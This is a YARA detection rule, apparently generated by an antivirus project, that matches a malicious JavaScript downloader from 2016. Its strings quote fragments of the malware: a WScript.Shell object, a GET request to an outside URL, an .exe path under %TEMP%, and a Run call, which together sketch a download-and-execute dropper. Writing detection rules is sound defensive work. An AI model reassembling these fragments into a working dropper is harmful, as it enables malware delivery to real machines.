rule sig_20160328_10adc0f2dc7d032f5cd2b6c0c677ef63 {
  meta:
    description = "datamaliciousorder - file 20160328_10adc0f2dc7d032f5cd2b6c0c677ef63.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "fed69f0958c62f48827f472b6672d6bfb56cba119f85fe4b0f7e8d7bdf59a735"

  strings:
    $s1  = "function Ccrsofgqe() {return Jexxhkfua[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"vkLU4GvrD.exe\";};" fullword ascii
    $s2  = "do {WScript[Slzgjsz](Uxffnzq() * 11)} while (Hjjfk[\"readystate\"] < 4 );" fullword ascii
    $s3  = "Hjjfk[Sblzqsz](\"GET\", \"http://www.stopeugenicsnow.eu/m8dhs\", false);" fullword ascii
    $s4  = "function Oeizvzjf(Xhnuu, Rchcqji){return Xhnuu - Rchcqji;};" fullword ascii
    $s5  = "var Jexxhkfua = function Xfbav() {return WScript[Yjtifhlo](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Wpsesmnanf() {return ((Thilysv == true) && (Thilysv == Wuuuq)) ? 1 : Wnklgoyqpt;};" fullword ascii
    $s7  = "function Xssiwasf(Nhjwddn){Jexxhkfua[\"Run\"](Nhjwddn, Wnklgoyqpt, Wnklgoyqpt);};" fullword ascii
    $s8  = "Thilysv = true; " fullword ascii
    $s9  = "function Xyzygyetr()" fullword ascii
    $s10 = "return Oeizvzjf(Rttas, Rpfyvvk);" fullword ascii
    $s11 = "function Ciuhprgopw(){return Yjtifhlo;};" fullword ascii
    $s12 = "var Wuuuq = false;" fullword ascii
    $s13 = " while (Sweokrtvy){" fullword ascii
    $s14 = "Wuuuq = true; " fullword ascii
    $s15 = "var Thilysv = false;" fullword ascii
    $s16 = "function Kklvto(Lldzevxc) {var Dhfmr = (1, 2, 3, 4, 5, Lldzevxc); return Dhfmr;};" fullword ascii
    $s17 = "function Yobgzegxt(){return Ykpknbfiy;};" fullword ascii
    $s18 = "var Ghtpbvep = false;" fullword ascii
    $s19 = "function Uxffnzq(){return 22;};" fullword ascii
    $s20 = "var Sqkfjzmmp = new this[\"Date\"]();" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}